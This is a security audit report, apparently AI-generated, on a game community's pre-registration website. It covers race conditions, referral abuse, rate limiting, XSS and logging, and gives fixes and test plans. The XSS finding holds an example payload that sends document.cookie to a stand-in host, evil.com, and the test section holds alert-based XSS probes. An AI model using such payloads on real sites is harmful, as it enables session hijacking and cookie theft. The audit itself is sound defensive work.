# 🔐 Security Audit Report - Rank1 City Pre-Registration Website

> **Audit Date:** 6 December 2024  
> **Auditor:** Antigravity AI Security Analyst  
> **Simulation:** 5,000 Concurrent Users  
> **Status:** ⚠️ Several Issues Found - Action Required

---

## 📊 High-Level Summary

### Overall Health: **⚠️ MODERATE RISK**

| Area | Status | Risk Level |
|------|--------|------------|
| Authentication | ✅ Good | Low |
| Authorization (Access Control) | ✅ Good | Low |
| Database Security (SQL Injection) | ✅ Good | Low |
| Race Conditions | ⚠️ Issues Found | **High** |
| Rate Limiting | ⚠️ Partial | Medium |
| Input Validation | ⚠️ Needs Improvement | Medium |
| XSS Protection | ⚠️ Needs Improvement | Medium |
| Data Integrity | ⚠️ Issues Found | **High** |

### Biggest Risk Areas:
1. **Race Conditions** in gang/family join operations
2. **Referral System Abuse** potential
3. **Missing Rate Limiting** on critical endpoints
4. **XSS via logo_url and motd fields**

---

## 🔍 Detailed Findings

---

### 🔴 CRITICAL / P0 - Must Fix Before Launch

---

#### Finding #1: Race Condition in Gang/Family Join

**File/Location:** `app/api/gang/route.js` (Lines 130-158), `app/api/family/route.js` (Lines 91-119)

**Area:** Gang / Family System

**Type:** Security / Data Integrity

**Severity:** 🔴 **CRITICAL**

**Scenario (5,000 users):**
```
When 100 users simultaneously try to join the same gang (max_members = 25):

1. All 100 users query: SELECT member_count → returns 24
2. All 100 check: 24 < 25 → PASS
3. All 100 execute: UPDATE member_count = member_count + 1
4. All 100 get added successfully
5. Result: Gang has 124 members instead of 25!
```

**Root Cause (code):**
```javascript
// Lines 137-143 in gang/route.js
const [gang] = await connection.query(
    'SELECT id, member_count, max_members FROM gangs WHERE gang_code = ?',
    [inviteCode]
);
if (gang[0].member_count >= gang[0].max_members) throw new Error('Gang is full');

// NO LOCK! Between SELECT and UPDATE, another user can join
await connection.query(
    'UPDATE gangs SET member_count = member_count + 1 WHERE id = ?',
    [gang[0].id]
);
```

**Impact:**
- Gangs/Families can exceed max_members limit
- Unfair advantage for groups
- Database integrity violated

**Suggested Fix:**
```javascript
// Option 1: Use atomic UPDATE with condition
const [result] = await connection.query(
    `UPDATE gangs 
     SET member_count = member_count + 1 
     WHERE gang_code = ? AND member_count < max_members`,
    [inviteCode]
);

if (result.affectedRows === 0) {
    throw new Error('Gang is full or not found');
}

// Option 2: Use SELECT ... FOR UPDATE
await connection.query('SET TRANSACTION ISOLATION LEVEL SERIALIZABLE');
const [gang] = await connection.query(
    'SELECT id, member_count, max_members FROM gangs WHERE gang_code = ? FOR UPDATE',
    [inviteCode]
);
```

---

#### Finding #2: Duplicate Gang Code Possibility

**File/Location:** `app/api/gang/route.js` (Lines 72-82)

**Area:** Gang System

**Type:** Data Integrity Bug

**Severity:** 🔴 **CRITICAL**

**Scenario (5,000 users):**
```
Two users create gangs at the exact same millisecond:
1. User A: generateGangCode() → "GANG-ABCD"
2. User B: generateGangCode() → "GANG-ABCD" (same!)
3. Both INSERT succeed (if no UNIQUE constraint enforced properly)
4. Two gangs with same invite_code!
```

**Root Cause (code):**
```javascript
// Line 76-81: No uniqueness check before insert!
let newGangCode = generateGangCode();

// Direct insert without checking if code exists
const [result] = await connection.query(
    'INSERT INTO gangs (name, gang_code, invite_code, ...) VALUES (?, ?, ?, ...)',
    [name, newGangCode, newGangCode, ...]
);
```

**Impact:**
- Duplicate gang codes
- Users joining wrong gang
- Data corruption

**Suggested Fix:**
```javascript
// Generate unique code with retry loop
let newGangCode;
let isUnique = false;
let attempts = 0;

while (!isUnique && attempts < 10) {
    newGangCode = generateGangCode();
    const [existing] = await connection.query(
        'SELECT id FROM gangs WHERE gang_code = ?',
        [newGangCode]
    );
    if (existing.length === 0) isUnique = true;
    attempts++;
}

if (!isUnique) throw new Error('Could not generate unique gang code');
```

---

#### Finding #3: Referral System Abuse - Self-Referral Prevention Bypass

**File/Location:** `app/api/preregister/route.js` (Lines 59-105)

**Area:** Invite & Ticket System

**Type:** Logic Bug / Abuse

**Severity:** 🔴 **CRITICAL**

**Scenario:**
```
Attacker with multiple Discord accounts:
1. Account A registers, gets code "R1-AAAAAA"
2. Account B uses referral code "R1-AAAAAA" → A gets +1 ticket
3. Account C uses referral code "R1-AAAAAA" → A gets +1 ticket
4. Repeat with 100 fake accounts → A gets 100 tickets!
```

**Root Cause (code):**
```javascript
// Line 65: Only checks if referrer != self, not IP or device
if (referrer.length > 0 && referrer[0].discord_id !== discordId) {
    validReferredBy = referralCodeInput;
    
    // Credits tickets without any abuse detection
    await connection.query(
        'UPDATE preregistrations SET invite_count = invite_count + 1, ticket_count = ticket_count + 1 WHERE referral_code = ?',
        [validReferredBy]
    );
}
```

**Impact:**
- Unlimited ticket farming
- Unfair advantage in giveaways
- Devalues legitimate referrals

**Suggested Fix:**
```javascript
// Add IP-based rate limiting for referrals
const [ipCheck] = await connection.query(
    'SELECT COUNT(*) as count FROM preregistrations WHERE ip_address = ? AND referred_by IS NOT NULL',
    [ipAddress]
);

if (ipCheck[0].count >= 3) { // Max 3 referrals per IP
    validReferredBy = null; // Don't count referral from same IP
    console.log(`Referral abuse detected from IP: ${ipAddress}`);
}

// Also add time-based throttling
// Also consider Discord account age check (if API available)
```

---

### 🟠 HIGH / P1 - Important After Launch

---

#### Finding #4: Missing Rate Limiting on Gang/Family APIs

**File/Location:** `app/api/gang/route.js`, `app/api/family/route.js`

**Area:** Performance / Security

**Type:** Security / DDoS Risk

**Severity:** 🟠 **HIGH**

**Scenario (5,000 users):**
```
Attacker spams POST /api/gang with action='join':
- 1000 requests per second
- Database connection pool exhausted
- Server becomes unresponsive
- Legitimate users cannot access
```

**Root Cause:**
```javascript
// Gang route has NO rate limiting!
export async function POST(request) {
    // Missing: rateLimit(ip, limit, windowMs)
    const session = await getServerSession(authOptions);
    ...
}
```

**Impact:**
- DoS vulnerability
- Database overload
- Connection pool exhaustion

**Suggested Fix:**
```javascript
import { rateLimit } from '@/lib/rate-limit';

export async function POST(request) {
    const ip = request.headers.get("x-forwarded-for") || "unknown";
    
    if (!rateLimit(ip, 10, 60000)) { // 10 requests per minute
        return NextResponse.json({ error: 'Too Many Requests' }, { status: 429 });
    }
    
    // ... rest of code
}
```

---

#### Finding #5: XSS via logo_url and motd Fields

**File/Location:** `components/GangManager.js` (Lines 482-487), `components/FamilyManager.js`

**Area:** Security / XSS

**Type:** Security Vulnerability

**Severity:** 🟠 **HIGH**

**Scenario:**
```
Attacker sets logo_url to:
javascript:alert('XSS')

Or sets motd to:
<img src=x onerror="document.location='https://evil.com/steal?cookie='+document.cookie">
```

**Root Cause (code):**
```jsx
// GangManager.js Line 483-486
{gang.logo_url ? (
    <img
        src={gang.logo_url}  // No validation!
        alt={gang.name}
        ...
    />
) : (...)}

// motd displayed directly
<div className="...">{gang.motd}</div> // Could contain HTML
```

**Impact:**
- Session hijacking
- Cookie theft
- Malicious redirects

**Suggested Fix:**
```javascript
// 1. Validate URL on server (gang/route.js)
function isValidImageUrl(url) {
    if (!url) return true;
    try {
        const parsed = new URL(url);
        const allowedDomains = ['pic.in.th', 'i.imgur.com', 'imgbb.com', 'cdn.discordapp.com'];
        return allowedDomains.some(domain => parsed.hostname.endsWith(domain));
    } catch {
        return false;
    }
}

// 2. Sanitize motd on client
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(gang.motd || '') }} />

// Or just use plain text:
<div>{gang.motd}</div> // React auto-escapes by default for plain text
```

---

#### Finding #6: member_count Desync Potential

**File/Location:** `app/api/gang/route.js`, Database Schema

**Area:** Data Integrity

**Type:** Logic Bug

**Severity:** 🟠 **HIGH**

**Scenario (5,000 users):**
```
1. Gang has 10 members, member_count = 10
2. User A leaves (member_count = 9)
3. Network error - connection.commit() fails
4. User A's gang_id is still set (rollback worked partially)
5. member_count = 9, but actual members = 10
```

**Root Cause:**
```javascript
// Storing count separately instead of computing from actual members
// gangs.member_count can become out of sync with reality
```

**Impact:**
- Users unable to join "full" gangs that aren't actually full
- Phantom members counted

**Suggested Fix:**
```javascript
// Option 1: Always compute from actual data
const [countResult] = await pool.query(
    'SELECT COUNT(*) as count FROM preregistrations WHERE gang_id = ?',
    [gangId]
);
const actualCount = countResult[0].count;

// Option 2: Use database trigger (already exists as stored procedure)
// Call sp_update_gang_member_count after every change

// Option 3: Periodic sync job
// cron: UPDATE gangs g SET member_count = (SELECT COUNT(*) FROM preregistrations WHERE gang_id = g.id);
```

---

### 🟡 MEDIUM / P2 - Nice to Have

---

#### Finding #7: Rate Limiter Memory Leak

**File/Location:** `lib/rate-limit.js` (Lines 21-24)

**Area:** Performance

**Type:** Performance / Memory

**Severity:** 🟡 **MEDIUM**

**Scenario (5,000 users):**
```
10,000 unique IPs hit the server
rateLimitMap grows to 10,000 entries
Memory usage increases continuously
Only cleared when > 10,000 (with .clear() which removes everything)
```

**Root Cause:**
```javascript
// Line 21-24: Simplistic cleanup
if (rateLimitMap.size > 10000) {
    rateLimitMap.clear(); // Clears EVERYTHING, including recent valid entries
}
```

**Impact:**
- Memory growth over time
- All rate limits reset simultaneously (attack window)

**Suggested Fix:**
```javascript
// Smarter cleanup: Remove only expired entries
function cleanupExpiredEntries(windowMs) {
    const cutoff = Date.now() - windowMs;
    for (const [ip, timestamps] of rateLimitMap.entries()) {
        const valid = timestamps.filter(t => t > cutoff);
        if (valid.length === 0) {
            rateLimitMap.delete(ip);
        } else {
            rateLimitMap.set(ip, valid);
        }
    }
}

// Call periodically (e.g., every 5 minutes)
setInterval(() => cleanupExpiredEntries(60000), 300000);
```

---

#### Finding #8: Missing Input Validation - Gang/Family Name

**File/Location:** `app/api/gang/route.js` (Line 73)

**Area:** Input Validation

**Type:** Logic / UX

**Severity:** 🟡 **MEDIUM**

**Scenario:**
```
User creates gang with name: "    " (spaces only) → Passes length check (4 chars)
User creates gang with name: "<script>alert(1)</script>" → 27 chars, passes
User creates gang with name: extremely-long-name-with-200-characters... → Passes
```

**Root Cause:**
```javascript
// Line 73: Only checks length >= 3
if (!name || name.length < 3) throw new Error('Gang name too short');
// No max length check
// No character validation
// No trim()
```

**Suggested Fix:**
```javascript
// Comprehensive validation
const trimmedName = name?.trim();
if (!trimmedName) throw new Error('Gang name is required');
if (trimmedName.length < 3) throw new Error('Gang name must be at least 3 characters');
if (trimmedName.length > 20) throw new Error('Gang name cannot exceed 20 characters');
if (!/^[a-zA-Z0-9\s\u0E00-\u0E7F]+$/.test(trimmedName)) {
    throw new Error('Gang name can only contain letters, numbers, and Thai characters');
}
```

---

#### Finding #9: Discord ID Type Inconsistency

**File/Location:** Multiple files

**Area:** Data Integrity

**Type:** Bug

**Severity:** 🟡 **MEDIUM**

**Scenario:**
```
Discord IDs are 18-digit numbers like "793410711396024370"
JavaScript Number.MAX_SAFE_INTEGER = 9007199254740991 (16 digits)
BigInt handling varies across the codebase
```

**Root Cause:**
```javascript
// Some places cast to String explicitly
targetDiscordId = String(targetDiscordId);

// Some places don't
if (gang[0].leader_discord_id !== discordId) { ... }

// Database uses VARCHAR(50) which is correct
// But JavaScript comparison might fail with BigInt
```

**Impact:**
- Leader verification could fail
- Member lookup could fail
- Inconsistent behavior

**Suggested Fix:**
```javascript
// Always ensure string comparison
const discordId = String(session.user.id);

// In database queries, ensure consistent type
'SELECT ... WHERE discord_id = CAST(? AS CHAR)'
```

---

#### Finding #10: Sensitive Data Exposure via Console Logs

**File/Location:** Multiple API routes

**Area:** Security / Logging

**Type:** Security

**Severity:** 🟡 **MEDIUM**

**Root Cause:**
```javascript
// gang/route.js Lines 134, 220, 252
console.log(`[Gang] Join Request: User=${discordId}, Code=${inviteCode}`);
console.log(`[Gang] Kicking member: Leader=${discordId}, Target=${targetDiscordId}`);
```

**Impact:**
- Discord IDs exposed in server logs
- Invite codes visible in logs
- Potential GDPR/Privacy concern

**Suggested Fix:**
```javascript
// Use environment-based logging
if (process.env.NODE_ENV === 'development') {
    console.log(`[Gang] Join Request: User=${discordId.slice(-4)}, Code=${inviteCode}`);
}

// Or use proper logging library with log levels
import logger from '@/lib/logger';
logger.debug('Gang join', { userId: discordId.slice(-4) });
```

---

## 📋 Prioritized TODO List

### P0 - Must Fix Before Launch 🔴

| # | Issue | File | Effort |
|---|-------|------|--------|
| 1 | Race condition in gang/family join | `gang/route.js`, `family/route.js` | 2h |
| 2 | Duplicate gang code prevention | `gang/route.js` | 1h |
| 3 | Referral abuse prevention (IP limit) | `preregister/route.js` | 2h |

### P1 - Important After Launch 🟠

| # | Issue | File | Effort |
|---|-------|------|--------|
| 4 | Add rate limiting to gang/family APIs | `gang/route.js`, `family/route.js` | 1h |
| 5 | XSS protection for logo_url and motd | `GangManager.js`, API routes | 2h |
| 6 | member_count sync verification | API routes + cron job | 2h |

### P2 - Nice to Have 🟡

| # | Issue | File | Effort |
|---|-------|------|--------|
| 7 | Rate limiter memory optimization | `rate-limit.js` | 1h |
| 8 | Input validation improvements | API routes | 1h |
| 9 | Discord ID type consistency | Multiple | 1h |
| 10 | Sensitive data logging cleanup | API routes | 0.5h |

---

## 🧪 Additional Test Suggestions

### Manual QA Scenarios

1. **Race Condition Test:**
   - Open 10 browser tabs with different accounts
   - All try to join same gang simultaneously
   - Verify member_count doesn't exceed max

2. **Referral Abuse Test:**
   - Create 5 accounts from same IP with same referral code
   - Verify ticket count doesn't grow linearly

3. **XSS Test:**
   - Try setting logo_url to `javascript:alert(1)`
   - Try setting motd to `<img src=x onerror=alert(1)>`

4. **Authorization Test:**
   - Non-leader tries to kick member via API
   - Non-member tries to access gang settings

### Future Automated Tests

```javascript
// Example Jest test for race condition
describe('Gang Join Race Condition', () => {
    it('should not exceed max_members under concurrent joins', async () => {
        const gangCode = 'TEST-RACE';
        const promises = [];
        
        for (let i = 0; i < 30; i++) {
            promises.push(
                fetch('/api/gang', {
                    method: 'POST',
                    body: JSON.stringify({ action: 'join', inviteCode: gangCode }),
                    headers: { 'Authorization': `Bearer ${tokens[i]}` }
                })
            );
        }
        
        await Promise.all(promises);
        
        const gang = await getGang(gangCode);
        expect(gang.member_count).toBeLessThanOrEqual(25);
    });
});
```

### Load Testing Tools

- **Artillery.io** - For API load testing
- **k6** - For performance testing
- **Locust** - For Python-based load testing

```yaml
# artillery.yml example
config:
  target: "http://localhost:3000"
  phases:
    - duration: 60
      arrivalRate: 100
scenarios:
  - name: "Gang Join Storm"
    flow:
      - post:
          url: "/api/gang"
          json:
            action: "join"
            inviteCode: "GANG-TEST"
```

---

## ✅ What's Already Good

1. **✅ SQL Injection Protection** - Using parameterized queries consistently
2. **✅ Session-based Auth** - NextAuth properly configured
3. **✅ Authorization Checks** - Leader verification exists for sensitive actions
4. **✅ Transaction Usage** - Database transactions with rollback on error
5. **✅ BigNumbers Support** - Database configured with `bigNumberStrings: true`
6. **✅ Connection Pooling** - Proper pool configuration with limits
7. **✅ Gang/Family Mutual Exclusion** - Users can't be in both simultaneously

---

## 📊 Risk Matrix

|  | Low Impact | Medium Impact | High Impact |
|--|------------|---------------|-------------|
| **High Likelihood** | Input validation | XSS via fields | Race conditions |
| **Medium Likelihood** | Memory leak | Discord ID issues | Referral abuse |
| **Low Likelihood** | Logging exposure | - | Duplicate codes |

---

> **Report Generated:** 6 December 2024 03:30 AM  
> **Review Required:** Development Team  
> **Next Audit:** After P0 fixes implemented
